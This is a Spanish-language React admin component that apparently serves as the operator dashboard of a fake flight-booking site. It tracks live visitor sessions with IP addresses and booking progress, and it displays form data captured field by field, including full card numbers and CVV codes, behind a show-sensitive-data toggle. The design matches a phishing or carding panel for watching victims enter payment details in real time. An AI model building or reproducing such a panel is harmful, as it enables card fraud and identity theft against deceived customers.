import React, { useState, useEffect } from 'react';
import { adminService } from '../../../services/adminService';
import Icon from '../../../components/AppIcon';

const UnifiedSessionMonitor = ({ isMobile = false, title = "Monitoreo de Sesiones en Tiempo Real" }) => {
  const [sessions, setSessions] = useState([]);
  const [adminSessions, setAdminSessions] = useState([]);
  const [capturedData, setCapturedData] = useState({});
  const [selectedSession, setSelectedSession] = useState(null);
  const [showSensitiveData, setShowSensitiveData] = useState(false);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [activeTab, setActiveTab] = useState('clients'); // 'clients' or 'admins'

  useEffect(() => {
    loadSessionData();
    
    // Subscribe to real-time session updates
    const unsubscribeSession = adminService?.subscribeToSessions((payload) => {
      console.log('Real-time session update:', payload);
      setTimeout(() => loadSessionData(), 500); // Reload data after small delay
    });

    const unsubscribeData = adminService?.subscribeToCapturedData((payload) => {
      console.log('Real-time data captured:', payload);
      setTimeout(() => loadSessionData(), 500); // Reload data after small delay
    });

    return () => {
      if (unsubscribeSession && typeof unsubscribeSession === 'function') unsubscribeSession();
      if (unsubscribeData && typeof unsubscribeData === 'function') unsubscribeData();
    };
  }, []);

  const loadSessionData = async () => {
    setLoading(true);
    try {
      // Load active sessions with activity tracking
      const { data: sessionData, error: sessionError } = (await adminService?.getActiveSessionsWithActivity?.(50)) || { data: [], error: null };
      
      if (sessionError) {
        setError('Error cargando sesiones: ' + sessionError?.message);
        return;
      }

      const validSessions = Array.isArray(sessionData) ? sessionData : [];
      
      // Separate client sessions from admin sessions
      const clientSessions = validSessions?.filter(session => 
        !session?.participantEmail?.includes('admin') && 
        !session?.participantName?.toLowerCase()?.includes('admin')
      ) || [];
      
      const adminSessionsData = validSessions?.filter(session => 
        session?.participantEmail?.includes('admin') || 
        session?.participantName?.toLowerCase()?.includes('admin')
      ) || [];

      setSessions(clientSessions);
      setAdminSessions(adminSessionsData);

      // Load captured data for the first few active sessions
      const sessionsToLoad = validSessions?.slice(0, 5);
      for (const session of sessionsToLoad) {
        if (session?.sessionId && !capturedData?.[session?.sessionId]) {
          await loadCapturedData(session?.sessionId);
        }
      }

      setError(null);
    } catch (err) {
      console.error('Error loading session data:', err);
      setError('Error general cargando datos: ' + (err?.message || 'Error desconocido'));
    } finally {
      setLoading(false);
    }
  };

  const loadCapturedData = async (sessionId) => {
    try {
      const { data, error } = (await adminService?.getCapturedData?.(sessionId)) || { data: [], error: null };
      if (!error && Array.isArray(data)) {
        setCapturedData(prev => ({
          ...prev,
          [sessionId]: data?.map(item => ({
            id: item?.id,
            fieldName: item?.field_name,
            fieldValue: item?.field_value,
            isSensitive: item?.is_sensitive,
            formStep: item?.form_step,
            capturedAt: item?.captured_at,
            sessionId: item?.session_id
          }))
        }));
      }
    } catch (err) {
      console.log('Error loading captured data for session:', sessionId);
    }
  };

  const handleSessionClick = async (session) => {
    setSelectedSession(session);
    if (!capturedData?.[session?.sessionId]) {
      await loadCapturedData(session?.sessionId);
    }
  };

  const formatTimestamp = (timestamp) => {
    if (!timestamp) return 'N/A';
    return new Date(timestamp)?.toLocaleString('es-CO', {
      timeZone: 'America/Bogota',
      day: '2-digit',
      month: '2-digit', 
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const formatFieldLabel = (fieldName) => {
    if (!fieldName) return 'Campo desconocido';
    const labels = {
      search_from: 'Origen',
      search_to: 'Destino',
      search_date: 'Fecha',
      passenger_count: 'Pasajeros',
      selected_flight_id: 'Vuelo Seleccionado',
      selected_price: 'Precio',
      passenger_1_full_name: 'Nombre Pasajero',
      passenger_1_email: 'Email Pasajero',
      passenger_1_phone: 'Teléfono Pasajero',
      billing_email: 'Email Facturación',
      billing_address: 'Dirección',
      payment_card_holder: 'Titular Tarjeta',
      payment_card_number_masked: 'Tarjeta (Enmascarada)',
      final_card_number: 'Número Tarjeta Completo',
      final_card_cvv: 'CVV',
      final_amount: 'Monto Final'
    };
    return labels?.[fieldName] || fieldName?.replace(/_/g, ' ')?.replace(/\b\w/g, l => l?.toUpperCase());
  };

  const getStepName = (stepNumber) => {
    const stepNames = {
      0: 'Inicio',
      1: 'Búsqueda',
      2: 'Selección',
      3: 'Pasajeros',
      4: 'Pago',
      5: 'Confirmación',
      6: 'Completado'
    };
    return stepNames?.[stepNumber] || 'Desconocido';
  };

  const getRiskColor = (level) => {
    switch (level?.toLowerCase()) {
      case 'critical': return 'text-red-600 bg-red-50 border-red-200';
      case 'high': return 'text-orange-600 bg-orange-50 border-orange-200';
      case 'medium': return 'text-yellow-600 bg-yellow-50 border-yellow-200';
      default: return 'text-green-600 bg-green-50 border-green-200';
    }
  };

  const getStatusColor = (isActive) => {
    return isActive ? 'text-green-600 bg-green-50' : 'text-gray-600 bg-gray-50';
  };

  const renderSessionCard = (session, isAdmin = false) => {
    const isSelected = selectedSession?.sessionId === session?.sessionId;
    
    return (
      <div
        key={session?.sessionId}
        onClick={() => handleSessionClick(session)}
        className={`p-3 rounded-lg border cursor-pointer transition-all duration-200 ${
          isSelected
            ? 'border-blue-500 bg-blue-50 shadow-md' 
            : 'border-border hover:border-primary hover:shadow-sm'
        }`}
      >
        <div className="flex items-start justify-between mb-2">
          <div className="flex-1 min-w-0">
            <div className="flex items-center space-x-2 mb-1">
              <span className="font-medium text-sm text-foreground truncate">
                {session?.clientId || `Cliente-${session?.sessionId?.substring(0, 8)}`}
              </span>
              {isAdmin && (
                <span className="px-2 py-0.5 bg-purple-100 text-purple-800 text-xs rounded-full">
                  Admin
                </span>
              )}
            </div>
            <p className="text-xs text-text-secondary truncate">
              {session?.participantEmail || session?.participantName || 'Anónimo'}
            </p>
          </div>
          <div className="flex flex-col items-end space-y-1">
            <span className={`px-2 py-0.5 rounded-full text-xs font-medium ${getStatusColor(session?.isActive)}`}>
              {session?.isActive ? 'ACTIVO' : 'INACTIVO'}
            </span>
            <span className={`px-1 py-0.5 rounded text-xs border ${getRiskColor(session?.riskLevel)}`}>
              {(session?.riskLevel || 'low')?.toUpperCase()}
            </span>
          </div>
        </div>
        
        <div className="grid grid-cols-2 gap-2 text-xs text-text-secondary mb-2">
          <div className="flex items-center">
            <Icon name="MapPin" size={12} className="mr-1" />
            <span className="truncate">
              IP: {session?.ipAddress || 'N/A'}
            </span>
          </div>
          <div className="flex items-center">
            <Icon name="Clock" size={12} className="mr-1" />
            <span className="truncate">
              {formatTimestamp(session?.startTime)?.split(' ')?.[1] || 'N/A'}
            </span>
          </div>
        </div>

        <div className="flex items-center justify-between">
          <div className="flex items-center space-x-1">
            <Icon name="Navigation" size={12} />
            <span className="text-xs text-text-secondary">
              {getStepName(session?.stepNumber)} ({session?.stepNumber || 0}/{session?.totalSteps || 6})
            </span>
          </div>
          <div className="text-xs text-text-secondary">
            {session?.progress || 0}%
          </div>
        </div>

        {session?.isRecentlyActive && (
          <div className="flex items-center mt-2 text-xs text-green-600">
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse mr-1"></div>
            Actividad reciente
          </div>
        )}
      </div>
    );
  };

  const currentSessions = activeTab === 'clients' ? sessions : adminSessions;
  const sessionCount = sessions?.length || 0;
  const adminCount = adminSessions?.length || 0;

  if (loading) {
    return (
      <div className="bg-card border border-border rounded-card shadow-soft">
        <div className="p-4">
          <div className="animate-pulse">
            <div className="h-4 bg-gray-200 rounded w-1/4 mb-4"></div>
            <div className="space-y-3">
              {[...Array(3)]?.map((_, i) => (
                <div key={i} className="h-20 bg-gray-100 rounded"></div>
              ))}
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="bg-card border border-border rounded-card shadow-soft">
      <div className="p-3 sm:p-4 border-b border-border">
        <div className="flex flex-col space-y-3 sm:space-y-0 sm:flex-row sm:items-center sm:justify-between">
          <h2 className="text-lg sm:text-xl font-heading font-semibold text-card-foreground flex items-center">
            <Icon name="Activity" size={18} className="mr-2 text-primary" />
            <span className="truncate">
              {isMobile ? 'Monitor Unificado' : title}
            </span>
          </h2>
          
          <div className="flex items-center justify-between sm:justify-start space-x-3">
            <div className="flex items-center space-x-1">
              <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
              <span className="text-xs text-text-secondary">
                Tiempo Real
              </span>
            </div>
            
            <button
              onClick={() => setShowSensitiveData(!showSensitiveData)}
              className={`px-2 py-1 text-xs rounded transition-micro flex items-center ${
                showSensitiveData ? 'bg-primary text-primary-foreground' : 'text-text-secondary hover:text-primary'
              }`}
            >
              <Icon name={showSensitiveData ? "EyeOff" : "Eye"} size={12} className="mr-1" />
              {showSensitiveData ? 'Ocultar' : 'Mostrar'}
            </button>
          </div>
        </div>

        {/* Tab Navigation */}
        <div className="flex mt-3 border-b border-border">
          <button
            onClick={() => setActiveTab('clients')}
            className={`px-4 py-2 text-sm font-medium transition-colors ${
              activeTab === 'clients' ?'border-b-2 border-primary text-primary' :'text-text-secondary hover:text-foreground'
            }`}
          >
            Clientes ({sessionCount})
          </button>
          <button
            onClick={() => setActiveTab('admins')}
            className={`px-4 py-2 text-sm font-medium transition-colors ${
              activeTab === 'admins' ?'border-b-2 border-primary text-primary' :'text-text-secondary hover:text-foreground'
            }`}
          >
            Administradores Online ({adminCount})
          </button>
        </div>
      </div>
      {error && (
        <div className="p-4 bg-red-50 border-l-4 border-red-400">
          <div className="flex">
            <Icon name="AlertTriangle" size={16} className="text-red-400 mr-2 mt-0.5" />
            <p className="text-red-700 text-sm">{error}</p>
          </div>
        </div>
      )}
      <div className="flex flex-col lg:flex-row">
        {/* Sessions List */}
        <div className="w-full lg:w-1/2 border-r-0 lg:border-r border-border">
          <div className="p-3 sm:p-4">
            <h4 className="font-medium text-foreground mb-3 flex items-center">
              <Icon name="Users" size={16} className="mr-2" />
              {activeTab === 'clients' ? `Sesiones de Clientes (${sessionCount})` : `Administradores Online (${adminCount})`}
            </h4>
            
            <div className="space-y-2 max-h-96 overflow-y-auto">
              {currentSessions?.length === 0 ? (
                <div className="text-center py-8 text-text-secondary">
                  <Icon name="Users" size={32} className="mx-auto mb-3 text-text-secondary" />
                  <p className="text-sm">
                    {activeTab === 'clients' ?'No hay clientes activos' :'No hay administradores en línea'
                    }
                  </p>
                  <p className="text-xs mt-2">
                    {activeTab === 'clients' ?'Las sesiones de clientes aparecerán automáticamente cuando usuarios ingresen a la aplicación' :'Los administradores aparecerán cuando accedan al panel'
                    }
                  </p>
                </div>
              ) : (
                currentSessions?.map((session) => 
                  renderSessionCard(session, activeTab === 'admins')
                )
              )}
            </div>
          </div>
        </div>

        {/* Captured Data */}
        <div className="w-full lg:w-1/2">
          <div className="p-3 sm:p-4">
            {selectedSession ? (
              <>
                <h4 className="font-medium text-foreground mb-3 flex items-center">
                  <Icon name="Database" size={16} className="mr-2" />
                  Datos Capturados - {selectedSession?.clientId}
                </h4>
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {capturedData?.[selectedSession?.sessionId]?.length > 0 ? (
                    capturedData?.[selectedSession?.sessionId]?.map((data) => (
                      <div key={data?.id} className="border border-border rounded-lg p-3 bg-surface">
                        <div className="flex items-center justify-between mb-2">
                          <span className="font-medium text-sm text-foreground">
                            {formatFieldLabel(data?.fieldName)}
                          </span>
                          <div className="flex items-center space-x-2">
                            <span className="text-xs px-2 py-0.5 bg-blue-100 text-blue-800 rounded">
                              Paso {data?.formStep}
                            </span>
                            {data?.isSensitive && (
                              <span className="text-xs px-2 py-0.5 bg-red-100 text-red-800 rounded">
                                Sensible
                              </span>
                            )}
                          </div>
                        </div>
                        <div className="text-sm text-foreground mb-2">
                          {data?.isSensitive && !showSensitiveData ? (
                            <span className="text-text-secondary italic">
                              *** Información sensible oculta ***
                            </span>
                          ) : (
                            <span className="font-mono bg-gray-50 px-2 py-1 rounded text-xs">
                              {data?.fieldValue || 'N/A'}
                            </span>
                          )}
                        </div>
                        <div className="text-xs text-text-secondary flex items-center">
                          <Icon name="Clock" size={12} className="mr-1" />
                          {formatTimestamp(data?.capturedAt)}
                        </div>
                      </div>
                    ))
                  ) : (
                    <div className="text-center py-8 text-text-secondary">
                      <Icon name="Database" size={32} className="mx-auto mb-3 text-text-secondary" />
                      <p className="text-sm">No hay datos capturados</p>
                      <p className="text-xs mt-1">Los datos aparecerán cuando el usuario complete formularios</p>
                    </div>
                  )}
                </div>
              </>
            ) : (
              <div className="text-center py-12 text-text-secondary">
                <Icon name="MousePointer" size={48} className="mx-auto mb-4 text-text-secondary" />
                <p className="text-sm mb-2">Selecciona una sesión</p>
                <p className="text-xs">Haz clic en una sesión para ver los datos capturados en tiempo real</p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default UnifiedSessionMonitor;